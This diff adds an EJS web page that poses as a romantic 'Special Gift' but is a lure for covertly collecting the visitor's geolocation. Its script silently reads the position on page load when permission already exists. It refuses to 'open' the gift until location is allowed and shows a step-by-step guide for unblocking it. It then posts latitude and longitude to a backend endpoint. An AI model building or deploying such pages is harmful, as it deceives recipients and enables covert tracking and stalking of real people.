@@ -1,0 +1,461 @@
+<!-- views/index.ejs -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Special Gift ❤️</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #ff4b91, #ff8fb1);
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .title {
+            color: white;
+            font-size: 40px;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+
+        .gift-box {
+            font-size: 120px;
+            cursor: pointer;
+            transition: 0.3s;
+            user-select: none;
+        }
+
+        .gift-box:hover {
+            transform: scale(1.1);
+        }
+
+        .tap-text {
+            margin-top: 20px;
+            color: white;
+            font-size: 22px;
+        }
+
+        /* Permission denied guide overlay */
+        #permissionGuide {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #permissionGuide .guide-box {
+            background: white;
+            border-radius: 20px;
+            padding: 35px 28px;
+            text-align: center;
+            max-width: 310px;
+            width: 90%;
+        }
+
+        #permissionGuide .guide-box .lock-icon {
+            font-size: 48px;
+        }
+
+        #permissionGuide .guide-box h3 {
+            color: #ff4b91;
+            font-size: 18px;
+            margin: 12px 0 8px;
+        }
+
+        #permissionGuide .guide-box p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 6px;
+        }
+
+        #permissionGuide .guide-box .steps {
+            background: #fff0f6;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin: 14px 0;
+            text-align: left;
+            font-size: 13px;
+            color: #444;
+            line-height: 2;
+        }
+
+        #permissionGuide .guide-box .steps b {
+            color: #ff4b91;
+        }
+
+        .guide-visual {
+            margin: 14px auto;
+            width: 100%;
+        }
+
+        #closeGuideBtn {
+            margin-top: 6px;
+            padding: 10px 26px;
+            background: linear-gradient(135deg, #ff4b91, #ff8fb1);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 15px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* Gift open message */
+        #giftMessage {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #giftMessage .open-heart {
+            font-size: 100px;
+            animation: popIn 0.5s ease forwards;
+        }
+
+        #giftMessage .message-text {
+            margin-top: 25px;
+            font-size: 30px;
+            font-weight: bold;
+            font-style: italic;
+            background: linear-gradient(135deg, #fff0f6, #ffe0ec);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: none;
+            animation: fadeInUp 1s ease forwards;
+            letter-spacing: 1px;
+        }
+
+        @keyframes popIn {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+
+            70% {
+                transform: scale(1.3);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeInUp {
+            0% {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Floating hearts */
+        .heart {
+            position: absolute;
+            font-size: 30px;
+            animation: floatHeart 4s linear forwards;
+            pointer-events: none;
+        }
+
+        @keyframes floatHeart {
+            0% {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+
+            100% {
+                transform: translateY(-600px) scale(1.8);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Permission denied guide -->
+    <div id="permissionGuide">
+        <div class="guide-box">
+            <div class="lock-icon">ⓘ</div>
+            <h3>Location Blocked!</h3>
+            <p>Gift kholne ke liye location allow karni hogi.</p>
+            <!-- Visual Guide SVG -->
+            <svg viewBox="0 0 260 310" xmlns="http://www.w3.org/2000/svg"
+                style="width:100%;margin:14px 0;border-radius:12px;">
+
+                <!-- Background -->
+                <rect width="260" height="310" rx="14" fill="#1e1e1e" />
+
+                <!-- Step 1 label -->
+                <text x="12" y="18" font-size="10" fill="#ff4b91" font-family="Arial" font-weight="bold">Step 1: Address
+                    bar ka ⓘ click karo</text>
+
+                <!-- Browser address bar -->
+                <rect x="8" y="24" width="244" height="28" rx="8" fill="#2d2d2d" />
+                <!-- Info circle icon highlight (pink glow) -->
+                <circle cx="26" cy="38" r="10" fill="#ff4b91" opacity="0.25" />
+                <!-- ⓘ drawn in SVG -->
+                <circle cx="26" cy="38" r="9" fill="none" stroke="#cccccc" stroke-width="1.5" />
+                <circle cx="26" cy="32" r="1.2" fill="#cccccc" />
+                <rect x="24.5" y="35" width="3" height="6" rx="1" fill="#cccccc" />
+                <text x="42" y="43" font-size="9" fill="#aaa" font-family="Arial">yoursite.com/gift</text>
+
+                <!-- Arrow pointing to lock -->
+                <polygon points="26,56 20,68 32,68" fill="#ff4b91" />
+                <line x1="26" y1="68" x2="26" y2="72" stroke="#ff4b91" stroke-width="2" />
+
+                <!-- Step 2 label -->
+                <text x="12" y="90" font-size="10" fill="#ff4b91" font-family="Arial" font-weight="bold">Step 2:
+                    Dropdown mein "Location" dekho</text>
+
+                <!-- Dropdown box -->
+                <rect x="8" y="96" width="180" height="140" rx="10" fill="#2a2a2a" stroke="#444" stroke-width="1" />
+
+                <!-- Site name row -->
+                <text x="20" y="116" font-size="10" fill="white" font-family="Arial"
+                    font-weight="bold">yoursite.com</text>
+                <line x1="8" y1="122" x2="188" y2="122" stroke="#444" stroke-width="0.8" />
+
+                <!-- Connection secure row -->
+                <text x="30" y="138" font-size="9" fill="#aaa" font-family="Arial">ⓘ Connection is secure</text>
+                <text x="174" y="138" font-size="9" fill="#888" font-family="Arial">›</text>
+                <line x1="8" y1="144" x2="188" y2="144" stroke="#333" stroke-width="0.5" />
+
+                <!-- Location row — HIGHLIGHTED -->
+                <rect x="8" y="145" width="180" height="26" fill="#ff4b91" opacity="0.18" />
+                <rect x="8" y="145" width="3" height="26" fill="#ff4b91" rx="2" />
+                <text x="30" y="162" font-size="10" fill="white" font-family="Arial" font-weight="bold">📍
+                    Location</text>
+
+                <!-- Dropdown for location -->
+                <rect x="120" y="150" width="58" height="16" rx="4" fill="#3a3a3a" stroke="#ff4b91" stroke-width="1" />
+                <text x="127" y="162" font-size="9" fill="#ff4b91" font-family="Arial" font-weight="bold">Allow ✓</text>
+                <line x1="8" y1="171" x2="188" y2="171" stroke="#333" stroke-width="0.5" />
+
+                <!-- Cookies row -->
+                <text x="30" y="187" font-size="9" fill="#888" font-family="Arial">🍪 Cookies and site data</text>
+                <line x1="8" y1="193" x2="188" y2="193" stroke="#333" stroke-width="0.5" />
+
+                <!-- Settings row -->
+                <text x="30" y="209" font-size="9" fill="#888" font-family="Arial">⚙️ Settings</text>
+                <line x1="8" y1="215" x2="188" y2="215" stroke="#333" stroke-width="0.5" />
+
+                <!-- About row -->
+                <text x="30" y="229" font-size="9" fill="#888" font-family="Arial">ℹ️ About this page</text>
+
+                <!-- Arrow pointing to Location row -->
+                <polygon points="200,158 215,152 215,164" fill="#ff4b91" />
+                <line x1="215" y1="158" x2="245" y2="158" stroke="#ff4b91" stroke-width="1.5" stroke-dasharray="3,2" />
+                <text x="195" y="148" font-size="8" fill="#ff4b91" font-family="Arial" font-weight="bold">Yahan</text>
+                <text x="193" y="158" font-size="8" fill="#ff4b91" font-family="Arial" font-weight="bold">click</text>
+                <text x="196" y="168" font-size="8" fill="#ff4b91" font-family="Arial" font-weight="bold">karo</text>
+
+                <!-- Step 3 -->
+                <text x="12" y="252" font-size="10" fill="#ff4b91" font-family="Arial" font-weight="bold">Step 3:
+                    "Allow" select karo → Reload 🔄</text>
+
+                <!-- Reload button illustration -->
+                <rect x="30" y="260" width="200" height="36" rx="18" fill="#ff4b91" />
+                <text x="88" y="284" font-size="13" fill="white" font-family="Arial" font-weight="bold">🔄 Reload
+                    Page</text>
+
+            </svg>
+
+            <p style="font-size:12px; color:#aaa;">Bina location ke gift nahi khulega 🎁</p>
+            <button id="closeGuideBtn" onclick="window.location.reload()">🔄 Reload Karo & Allow Karo</button>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <div class="container">
+
+        <div class="title">
+            For You ❤️
+        </div>
+
+        <!-- Gift box (before click) -->
+        <div id="giftSection">
+            <div class="gift-box" id="giftBox">
+                🎁
+            </div>
+            <div class="tap-text">
+                Tap The Gift 🎁
+            </div>
+        </div>
+
+        <!-- Gift open message (after click) -->
+        <div id="giftMessage">
+            <div class="open-heart">❤️</div>
+            <!-- <div class="message-text">My heart is of you,<br><em>Dear Friend</em> 💕</div> -->
+            <div class="message-text"><em>Dear Friend</em> 💕</div>
+        </div>
+
+    </div>
+
+    <script>
+
+        const giftBox = document.getElementById('giftBox');
+        const giftSection = document.getElementById('giftSection');
+        const giftMessage = document.getElementById('giftMessage');
+        const permissionGuide = document.getElementById('permissionGuide');
+
+        let savedLocation = null;
+        let giftOpened = false;
+
+        // ─── CHECK PERMISSION STATE ──────────────────────────────
+        async function checkPermissionState() {
+            if (!navigator.permissions) return 'unknown';
+            try {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                return result.state; // 'granted' | 'denied' | 'prompt'
+            } catch {
+                return 'unknown';
+            }
+        }
+
+        // ─── ON PAGE LOAD — silently try if already granted ──────
+        window.onload = async () => {
+            const state = await checkPermissionState();
+            if (state === 'granted') {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        savedLocation = {
+                            latitude: position.coords.latitude.toString(),
+                            longitude: position.coords.longitude.toString(),
+                        };
+                    },
+                    () => { }
+                );
+            }
+            // agar 'denied' ya 'prompt' hai toh kuch nahi karo — gift click pe handle hoga
+        };
+
+        // ─── LOCATION REQUEST ────────────────────────────────────
+        function requestLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { resolve(false); return; }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        savedLocation = {
+                            latitude: position.coords.latitude.toString(),
+                            longitude: position.coords.longitude.toString(),
+                        };
+                        resolve(true);
+                    },
+                    () => { resolve(false); }
+                );
+            });
+        }
+
+        // ─── SAVE LOCATION TO BACKEND ────────────────────────────
+        async function saveLocationToBackend() {
+            try {
+                const response = await fetch('/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        location: {
+                            latitude: savedLocation.latitude,
+                            longitude: savedLocation.longitude,
+                        }
+                    }),
+                });
+                const data = await response.json();
+                console.log(data);
+            } catch (error) {
+                console.log(error);
+            }
+        }
+
+        // ─── FLOATING HEARTS ─────────────────────────────────────
+        function createHeart() {
+            const heart = document.createElement('div');
+            heart.classList.add('heart');
+            heart.innerHTML = '❤️';
+            heart.style.left = Math.random() * window.innerWidth + 'px';
+            heart.style.bottom = '0px';
+            document.body.appendChild(heart);
+            setTimeout(() => heart.remove(), 4000);
+        }
+
+        // ─── GIFT CLICK ──────────────────────────────────────────
+        giftBox.addEventListener('click', async () => {
+
+            if (giftOpened) return;
+
+            if (!savedLocation) {
+
+                // Pehle check karo ki permission blocked hai ya sirf nahi maangi
+                const state = await checkPermissionState();
+
+                if (state === 'denied') {
+                    // Browser dobara popup nahi dikhayega — guide dikhao
+                    permissionGuide.style.display = 'flex';
+                    return;
+                }
+
+                // 'prompt' ya 'unknown' — browser ka default popup trigger hoga
+                const granted = await requestLocation();
+
+                if (!granted) {
+                    // User ne abhi deny kiya — guide dikhao
+                    permissionGuide.style.display = 'flex';
+                    return;
+                }
+            }
+
+            giftOpened = true;
+
+            // Location save karo
+            await saveLocationToBackend();
+
+            // Gift box hide karo
+            giftSection.style.display = 'none';
+
+            // Message show karo
+            giftMessage.style.display = 'flex';
+
+            // Hearts chalao
+            for (let i = 0; i < 40; i++) {
+                setTimeout(() => createHeart(), i * 120);
+            }
+        });
+
+    </script>
+
+</body>
+
+</html>
